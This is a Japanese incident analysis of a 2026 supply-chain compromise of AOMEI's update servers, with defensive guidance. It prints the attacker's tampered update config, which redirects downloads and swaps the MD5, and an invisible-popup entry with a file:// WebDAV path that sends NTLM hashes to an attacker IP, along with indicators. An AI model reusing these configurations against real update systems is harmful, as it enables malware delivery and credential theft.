INC-2026-0565AOMEI 更新基盤が5〜10分だけ改ざん

Google Threat Intelligence Group と Mandiant が2026年10月15日、バックアップ・リモートデスクトップ製品を提供する AOMEI Technology の更新基盤が2026年4月から7月にかけて UNC7017 に改ざんされていたと公表した——改ざんは1回あたり5〜10分で終わり、直後に正規の設定へ戻されるため、時点スキャンとファイル検査を事実上すり抜けた。その数分間に更新を確認したクライアントだけが CROSSROAD ダウンローダーと SHINYROAD バックドアを受け取った。被害は IT サービス・通信・高等教育などに及び、オーストラリア・ブラジル・インド・パキスタン・ポルトガル・シンガポール・南アフリカ・スペイン・スイス・トルコ・米国の組織が確認されている

脅威・攻撃キャンペーン委託先・再委託先起因で委託元多数に波及不正アクセス・侵害続報が続いている有名事象として記録（日本と直接の関係は薄い）設計・実装上の不備委託先・供給元起因公表されていない／不明
初報: 2026年10月15日 最終更新: 2026年10月16日

Google Threat Intelligence Group（GTIG）と Mandiant は2026年10月15日、バックアップ・ディスククローン製品「AOMEI Backupper」とリモートデスクトップ製品「AnyViewer」を提供する AOMEI Technology の更新配信基盤が、2026年4月から7月にかけて侵害されていたと公表した。攻撃者クラスタは UNC7017 として追跡されている。

この事案の核心は改ざんの長さである。

  • 5月28日: 10分間（05:40〜05:50 UTC）
  • 7月16日: 6分間（08:33〜08:39 UTC）
  • 7月20日: 5分間（10:35〜10:40 UTC）

各ウィンドウの終わりに、攻撃者は down_html.ini と Notifycfg.ini を正規の内容へ戻した。GTIG は、このような極端に短いウィンドウで実装されたソフトウェア供給網侵害に遭遇したのは初めてだとしている。結果として、時点スキャンと自動ファイル検査を事実上すり抜けた。その数分間に更新を確認したクライアントだけがマルウェアを受け取り、前後に確認したクライアントは正規のファイルを受け取る。

手口は脆弱性に依存しない。製品の正規の更新・ポップアップ描画の流れをそのまま使う。更新設定ファイルで配信先を攻撃者のサーバに差し替え、通知設定ファイルに約35,000行の [dummy_XXXXXX] を注入してバージョン検査を上書きし、優先度 9999 の 1×1 ピクセルの不可視ウィンドウで、展開されたばかりの実行ファイルを即座に起動させる。7月20日には同じ仕組みで file:// の WebDAV パスを参照させ、NetNTLMv2 ハッシュを攻撃者 IP へ送らせる第二の経路も加わった。ペイロードの実行を止めても認証情報の窃取は成立しうる。

配信される多段ペイロードは、環境検証とステージングを担う CROSSROAD と、Radmin の正規署名バイナリに DLL 検索順序ハイジャックで読み込ませるモジュラー型バックドア SHINYROAD である。CROSSROAD は外部 IP の国コードを確認し、CN（中国）であれば主要ペイロードの実行を中止する。

最初に気づいたのは AOMEI でも Google でもなく、Zoho の ManageEngine Threat Analysis Lab（METAL）の EDR テレメトリである（5月下旬）。Mandiant は2026年7月17日に AOMEI へ通知し、AOMEI は7月29日に是正措置を完了したと回答した。ただし GTIG は、サーバ側の修正ではエンドポイントは浄化されないと明記している。

攻撃の経過

公表された範囲の事実のみ。公表されていない段階は補完せず明示しています。

UNC7017 は2026年4月から7月にかけて AOMEI Technology の更新配信サーバに繰り返し侵入し、 更新設定ファイル down_html.ini と通知設定ファイル Notifycfg.ini を 1回あたり5〜10分だけ改ざんして、直後に正規の内容へ戻した。 改ざん中に更新を確認したクライアントは、攻撃者のサーバから 悪性の upgrade-now.zip を取得し、通知機構の指示で CROSSROAD を即時実行させられた。 CROSSROAD は環境を検証し、痕跡を巻き戻し、Radmin を装って SHINYROAD を永続化させた。 2026年7月20日には、優先度 9999 の 1×1 ピクセルの不可視ウィンドウで file:// の WebDAV パスを参照させ、NetNTLMv2 ハッシュを攻撃者 IP へ送らせる経路も加わった。 脆弱性は使われていない。製品の正規の更新・通知の流れがそのまま武器にされた。

    改ざんを1回あたり5〜10分に限り、終了時に down_html.ini と Notifycfg.ini を 正規の内容へ戻した（5月28日:10分、7月16日:6分、7月20日:5分）。 これによりベンダーの事後監査、時点スキャン、自動ファイル検査を回避し、 防御側が悪性の応答を生きた状態で捕らえる窓を数分に圧縮した

脆弱性を使わない——製品の正規の更新・通知の流れをそのまま武器にした原因・手口出典 [1]

この攻撃は製品の脆弱性に依存していない。AOMEI クライアントが持つ2つの正規の仕組みを、そのまま使っている。

1. 更新設定ファイル down_html.ini

クライアントは https://www2.aomeisoftware.com/download/abpopup/down_html.ini を定期的に HTTPS で取得する。このファイルにはバージョン番号・期待される更新パッケージの MD5・ダウンロード先 URL が書かれている。

攻撃者は改ざんウィンドウ中に、マイナービルド番号（thrid）を加算し、MD5 を自分のペイロードのものに書き換え、URL を自分のサーバへ向けた。7月16日の改ざんは次の形である（一次資料の図2）。

[Date]
-Url=https://www2.aomeisoftware.com/download/abpopup/upgrade-now.zip
+Url=https://promotion.storage-data.com/download/abpopup/upgrade-now.zip
Name=upgrade-now
[Version]
maj=8
min=2
-thrid=5
+thrid=6
[MD5]
-Val=EE89C99F3753231771170F5D9CBBAE1E
+Val=31323E7E738230FA6A8DEEF2B7894666

完全性の担保が平文の MD5 だけであることに注意したい。設定ファイル自体に署名が無いため、ファイルを書ける者は「期待されるハッシュ」も一緒に書き換えられる。ハッシュは自分で書けるなら検証にならない。

2. 通知設定ファイル Notifycfg.ini

クライアントは https://account.aomeitech.com/Notifycfg.ini も取得する。これはポップアップに何を表示するかを指示するファイルで、製品のローカルディレクトリにあるコマンドやプログラムを実行する指定を含む。

7月16日、攻撃者はこのファイルに 約35,000行の [dummy_XXXXXX] を注入した。目的は、クライアントの標準的なバージョン検査を上書きし、インストール済みバージョンに関わらず更新を発動させることである。そして展開されたばかりの upgrade-now.exe（CROSSROAD）をローカルの html/ ディレクトリから即座に実行させた。

つまり攻撃者は、「ダウンロードさせる機能」と「実行させる機能」を別々のファイルから呼び出し、組み合わせて使った。更新機能と販促（ポップアップ）機能が同じ経路に同居していたことが、この組み合わせを可能にしている。GTIG がベンダー向けの推奨として「更新機能とマーケティング機能を分離する」を挙げているのはこのためである。

巻き戻しとインフラの移行が、防御側の2つの手段をどちらも無効化した評価・解釈出典 [1]

ここからは本記録の作成者の評価である。

第一に、「巻き戻し」は検知回避ではなく証拠隠滅として効いている。ウィンドウの終わりに正規の内容へ戻すことで、次の3つが同時に成立する。

  1. ベンダーの事後監査が空振りする——AOMEI が自社サーバを調べた時点では正規の内容である
  2. 防御側が悪性の応答を生きた状態で捕らえる窓が数分しかない
  3. 侵害がその数分間にポーリングしたクライアントだけに限定される——被害を小さくする代わりに、検知される確率も小さくする

3番目は重要である。攻撃者は感染台数を意図的に絞っている。供給網侵害は通常「一度の改ざんで大量に配る」ことを狙うが、UNC7017 は逆に少数に絞って長く続ける設計を選んだ。GTIG が「可視性の外でさらに改ざんが行われた可能性が高い」とするのは、この設計では1回あたりの痕跡が小さすぎて数えられないという意味である。

第二に、インフラの移行が「ドメインを遮断する」という対処を無効化した。攻撃者は3段階で配信元を変えている。

時期 配信元 狙い
4〜5月 Alibaba Cloud OSS 正規クラウドのドメインに紛れる
7月1〜7日 storage-data.com 系の専用ドメイン ベンダーを模した名前
7月20日 Google Cloud Storage NRD 遮断の回避

7月20日の構成はとくに巧妙である。初回ダウンロードだけを Google Cloud Storage に向けることで、新規登録ドメイン（NRD）を遮断する企業プロキシを通過させ、実行後の CROSSROAD は二次ペイロードと C2 のために storage-data.com を使い続ける。つまり入口と通信先を分離し、入口側だけを「評判の良いドメイン」にした。

ここから引ける教訓は、NRD 遮断は入口制御として過信できないということである。公開クラウドストレージを「信頼済み」として一律に許可している環境では、この経路は素通しになる。

第三に、7月17日の通知の後、7月20日に改ざんが成立している。ベンダーが通知を受けてから是正完了を回答するまでの12日間のうちに、攻撃者はもう一度ウィンドウを開き、しかもそこで新しい手口（WebDAV による NTLM 強制認証）を追加している。通知から是正までの期間は、攻撃者にとって「まだ使える期間」である（本記録の評価）。

ペイロードの実行を止めても認証情報は取られる——1×1ピクセルの WebDAV 強制認証原因・手口出典 [1]

7月20日に追加された第二の経路は、ペイロードの実行とは独立に機能する。

改ざん前の Notifycfg.ini は、400×380 の正規の販促バナー（「World Cup Deals」）を表示していた。攻撃者はこれを次に置き換えた（一次資料の図4）。

[PopWindow1]
ID=307
Title=20260408-AB Flash Sale (All Lang 不含EN)
Address="file://8.210.84.56/DavWWWRoot/campaign/24hour-flash-sale.html"
Width=1
Height=1
Priority=9999

3つの指定が効いている。

  • Width=1 / Height=1: 1×1 ピクセル。利用者には見えない
  • Priority=9999: 最大の実行優先度。正規の告知を押しのけて必ず処理される
  • Address="file://…/DavWWWRoot/…": UNC/WebDAV パスの参照

クライアントがこの file:// リソースを要求すると、Windows は認証のために NetNTLMv2 ハッシュを攻撃者 IP（8.210.84.56）へ送る。利用者には何も見えない。

一次資料はこの点を明示している——ペイロードの実行がブロックされていても、認証情報の窃取は成立しうる。EDR が upgrade-now.exe を止めた環境でも、その数分間にポップアップの描画が走っていれば、ハッシュは出ていった可能性がある。

これはインシデント対応の判定基準に直接関わる。「マルウェアの実行はブロックした」という EDR のアラートを見て「影響なし」と結論するのは、本件では誤りである（本記録の評価）。同じ時刻帯に外向きの SMB（TCP 445）または WebDAV の通信があったかを別途確認しなければ、認証情報の露出を否定できない。

GTIG が防御の推奨として「外部への SMB（TCP 445）と WebDAV を遮断する」を挙げているのはこのためである。

対応の評価

評価材料がない判断は「評価材料なし」としています。結果論で断じないための区分です。
判断評価評価の根拠と留保
GTIG／Mandiant は2026年7月17日に AOMEI へ通知し、 AOMEI が7月29日に是正完了を回答した後、約2か月半を置いて10月15日に公表した。 公表に先立って影響を受けた可能性のある組織へ通知を行った部分的に機能本記録の作成者の評価である。ベンダー通知を先に行い、 影響を受けた可能性のある組織に個別通知してから公開する順序は妥当である。 ただし本件では、被害が機会主義的で「直接特定した範囲より広く及ぶ可能性が高い」と GTIG 自身が述べている。特定できなかった組織は個別通知を受けていないため、 公表の遅れがそのまま点検の遅れになる
改ざんウィンドウの開始・終了時刻を UTC の分単位で公開し、 設定ファイルの差分、約35,000行の注入、1×1 ピクセルの WebDAV 設定を 実際の記述そのままで示した。IoC・YARA・遡及ハンティングの推奨も含めた機能した本記録の作成者の評価である。改ざんウィンドウの時刻を分単位で出したことは、 防御側が「その時刻のプロキシ・FW ログ」というきわめて狭い範囲を 確実に照合できるという点で実務的な価値が高い。 設定ファイルの差分をそのまま示したことも、同種の仕組みを持つ他ベンダーが 自社製品の設計を点検する材料になる
AOMEI は配信サーバを保護する是正措置を取ったと回答した（7月29日）。 製品の提供停止や、利用者への一斉通知を行ったという記述は無い不十分本記録の作成者の評価である。一次資料自身が 「サーバ側の修正ではエンドポイントは浄化されない」と明記している。 本記録の作成者は2026年10月17日に AOMEI のサイトを確認したが 本件に関する公表を見つけられず、 利用者が影響を判断する材料は現状 GTIG のブログしか無い。 また down_html.ini は依然として平文 INI ＋ MD5 のみで、 設定ファイルへの署名の反映は確認できない（本記録の観測）
CISO・経営層への示唆
  • 「いま配信されているファイルが正規である」ことは、過去に正規だったことの証明にならない
    UNC7017 は改ざんを5〜10分で終え、終了時に正規の内容へ戻した。 ベンダーの事後監査も、防御側の時点スキャンも、 その時刻を外れていれば何も見つけられない。 一次資料は「ライブの Web チェックに頼るな」と明記している
    取るべき行動 インシデント判定のルールに「配信元の現況は影響の有無の根拠にしない」を明文化する。 ソフトウェア更新に起因する疑いが出たときは、 端末側に残る成果物（展開されたディレクトリ、取得した設定ファイル、 生成されたプロセスの記録）とプロキシ・FW ログの時刻照合で判断する手順にする。 そのためにログ保持期間を**最低6か月**確保する（本件は4か月遡る必要があった）
  • EDR が実行をブロックしても「影響なし」にならない——同じ改ざんが認証情報を取る経路を併設している
    2026年7月20日、攻撃者は 1×1 ピクセルの不可視ウィンドウで file:// の WebDAV パスを参照させ、NetNTLMv2 ハッシュを送らせた。 一次資料は「ペイロードの実行がブロックされていても認証情報の窃取は成立しうる」と指摘している
    取るべき行動 インシデント対応のチェックリストに 「ブロックしたアラートの前後における外向き SMB（445）・WebDAV 通信の確認」を加える。 ブロック済みアラートを自動クローズするルールがあれば、 供給網関連のアラートは対象から外す。 境界で外部への 445／WebDAV を既定で遮断する
  • 信頼済みの公開クラウドストレージを一律許可していると、NRD 遮断は素通しになる
    攻撃者は2026年7月20日、初回ダウンロードだけを Google Cloud Storage に向け、 新規登録ドメイン（NRD）を遮断する企業プロキシを回避した。 実行後の通信は storage-data.com を使い続けている。 入口と通信先を分離し、入口側だけを評判の良いドメインにする設計である
    取るべき行動 公開クラウドストレージ（storage.googleapis.com、*.aliyuncs.com、 *.blob.core.windows.net、*.s3.amazonaws.com 等）への許可を 「ドメイン単位の一律許可」から「バケット・パス単位の許可」に切り替える。 切り替えが難しい場合は、少なくとも実行ファイル・アーカイブのダウンロードを これらのドメインから禁止する
  • 導入している製品の「更新の仕組み」を、調達の審査項目に入れる
    本件は脆弱性を使っていない。 更新設定ファイルの完全性が平文 MD5 のみだったこと、 通知設定ファイルがローカルの実行ファイルを起動できたこと、 更新機能と販促（ポップアップ）機能が同じ経路に同居していたことが、 攻撃の前提をすべて用意していた
    取るべき行動 ソフトウェア調達の審査票に次の項目を加える—— ①更新パッケージを Authenticode 署名で検証しているか ②更新設定ファイル自体に署名があるか ③更新先のドメインが固定され、第三者ドメインへのリダイレクトを拒否するか ④通知・販促機能からローカルの実行ファイルを起動できないか ⑤配信サーバにアクセス制御・MFA・FIM があるか。 既存の導入済み製品についても、更新機構を持つものから順に棚卸しする
  • ベンダーへの通知から是正までの期間は、攻撃者にとって「まだ使える期間」である
    Mandiant は2026年7月17日に AOMEI へ通知し、 AOMEI は7月29日に是正完了を回答した。 その12日間のうち7月20日に改ざんウィンドウが成立し、 しかもそこで新しい手口（WebDAV による NTLM 強制認証）が追加されている
    取るべき行動 自社が供給元として通知を受けた場合の初動を事前に決める—— 「配信ファイルの変更を全面凍結する」「変更を承認フロー経由のみに限定する」 「配信ファイルの FIM を即時に有効化する」までを調査開始と同時に実施する。 調査の完了を待ってから対策を入れる順序にしない
  • 供給元が是正しても利用者への告知が無ければ、利用者の端末は浄化されない
    一次資料は「サーバ側の修正ではエンドポイントは浄化されない」と明記している。 本記録の作成者は2026年10月17日に AOMEI のサイトを確認したが 本件に関する公表を見つけられず、 利用者が影響を判断する材料は GTIG のブログしか無い（本記録の観測）
    取るべき行動 自社が導入しているソフトウェアについて、 ベンダーのセキュリティ告知を購読する経路（RSS・メーリングリスト）を整備する。 告知の経路を持たないベンダーの製品は、 脅威インテリジェンスベンダーの公表を監視対象に含める。 供給元が告知しない前提で、自社で遡及ハンティングを実施する体制を持つ
セキュリティ技術者への示唆
  • 更新プロセスが生成した未署名の子プロセスを検知ルールにする
    攻撃は AOMEI の正規の更新・通知の流れをそのまま使っており、 脆弱性も、異常な親プロセスも介在しない。 検知できる不自然さは「更新プロセスが未署名の実行ファイルを起動した」という一点にある
    取るべき行動 EDR／SIEM に次のルールを作る—— 親プロセスが更新・インストーラ系（Backupper.exe、ABNotify.exe、各種 updater）で、 子プロセスが未署名または発行元が親と異なる場合にアラートする。 あわせて `-WindowStyle Hidden` 付きの PowerShell の起動、 `--runtimechk` のような非標準引数付きの実行を警告対象にする
  • 正規署名バイナリが読み込む DLL の署名を見る（署名検証だけでは止まらない）
    SHINYROAD は Famatech Radmin 3.x の正規署名バイナリ FamItrfc.exe に DLL 検索順序ハイジャックで未署名の BlkScrDl.dll を読み込ませる。 ADAPTAGENT も Nitro PDF の見かけで Eztwain4.dll をサイドロードする。 いずれも「署名されたプロセス」として動く
    取るべき行動 EDR の ImageLoad イベントを使い、 署名済みバイナリが未署名 DLL を読み込んだ事象をアラートする。 誤検知を抑えるため、対象をユーザー書き込み可能領域 （%LOCALAPPDATA%、%TEMP%、%APPDATA%）からのロードに絞る。 あわせて WDAC／AppLocker でこれらの領域からの実行・ロードを既定で拒否する
  • 外部への SMB（TCP 445）と WebDAV を境界で既定拒否にする
    1×1 ピクセルの不可視ウィンドウが file:// の UNC/WebDAV パスを参照させ、 NetNTLMv2 ハッシュを攻撃者 IP（8.210.84.56）へ送らせた。 利用者には何も見えず、ペイロードの実行がブロックされていても成立する
    取るべき行動 ファイアウォールで外向きの TCP 445 と WebDAV（HTTP/HTTPS の PROPFIND 等）を 既定拒否にし、必要な宛先だけを許可リストで通す。 あわせて Windows のポリシー 「ネットワーク セキュリティ: リモート サーバーに送信する NTLM 認証を制限する」を 「すべて拒否」に向けて段階的に強め、例外を明示的に管理する
  • 2026年4月〜7月を対象に遡及ハンティングする——端点の痕跡と当時のログの両方で
    改ざんは数分で巻き戻されるため、現在の配信内容を見ても何も分からない。 一次資料は4月〜7月の遡及ハンティングを推奨している
    取るべき行動 次を確認する—— `%LOCALAPPDATA%\Radmin\`（BlkScrDl.dll、csvc\RuntimeComponent.dll、config.zip、 metadata.dat）、`%LOCALAPPDATA%\Nitro Pro\`（Eztwain4.dll、NitroPromotion.exe）、 `%TEMP%\svc*.tmp`、`%PROGRAMFILES(X86)%\AOMEI\*\Tmphtml\` と `html\`、 スケジュールタスク `\RadminComponentRuntime` と `\NitroRuntime`、 レジストリ `\REGISTRY\MACHINE\SYSTEM\Software\Microsoft\TIP\AggregateResults\data`。 Radmin・Nitro PDF を正規導入している環境では、 ファイル名ではなく署名の有無とハッシュで判定する。 プロキシログは User-Agent `Anyviewer-loader/1.0` と `serv.oss-cn-hongkong.aliyuncs.com` で検索する
  • ビーコンは間隔の規則性で見つける（宛先の評判に頼らない）
    ADAPTAGENT は 8.210.84.56:6800 へ2分間隔でビーコンし、 SHINYROAD は 8.218.65.184 へ初期は TCP 41397、後期は TCP 443 で接続する。 443 への移行は宛先ポートによる選別を無効化する。 攻撃者ドメインは2026年10月17日時点で名前解決しないため、 ドメインのブロックリストでは過去の感染を見つけられない（本記録の観測）
    取るべき行動 ネットワークログに対し、同一の内部ホスト→外部宛先の組で 通信間隔の分散が小さい（機械的な周期を持つ）セッションを抽出する検知を作る。 非標準ポート（本件では 6800、41397）への外向き通信は既定拒否にし、 443 についても SNI・JA3 での選別対象に含める
  • （自社が配信側であれば）設定ファイルに署名し、更新機能と販促機能を分離する
    改ざんされた down_html.ini は平文の INI で、完全性の担保は MD5 のみだった。 ファイルを書ける者は「期待されるハッシュ」も一緒に書き換えられる。 さらに Notifycfg.ini がローカルの実行ファイルを起動でき、 優先度の指定でバージョン検査を上書きできた
    取るべき行動 更新パッケージは Authenticode 署名と証明書チェーンで検証し、 設定ファイルに書かれた平文ハッシュだけに依存しない。 設定ファイル自体にも署名を付ける。 更新先のドメインを固定し、第三者ドメインや公開クラウドストレージへの リダイレクトを拒否する。 販促・通知の機能から実行ファイルを起動できないようにし、 ポップアップのアドレスに `file://` と UNC/WebDAV を禁止する。 配信サーバにアクセス制御・MFA・ファイル整合性監視（FIM）を導入する

該当する項目があれば、この事案と同じ構図が自組織でも成立しうることを意味します。
観点自社に当てはまるか該当する場合に何が起きうるか
委託・第三者部品□ AOMEI Backupper または AnyViewer を導入している （とくに2026年4月〜7月に稼働していた端末がある）改ざんウィンドウ中に更新を確認した端末だけが影響を受ける。 被害は機会主義的で、GTIG が直接特定した11か国より広く及ぶ可能性が高いとされている。 通知機構は `ja`（日本語クライアント）も配信対象に含む（本記録の観測）

認証・認可□ 外部への SMB（TCP 445）と WebDAV が境界で許可されており、 リモートサーバーへの NTLM 認証を制限していない1×1 ピクセルの不可視ウィンドウが file:// の UNC/WebDAV を参照させ、 NetNTLMv2 ハッシュを外部へ送らせた。 ペイロードの実行をブロックしていても成立する
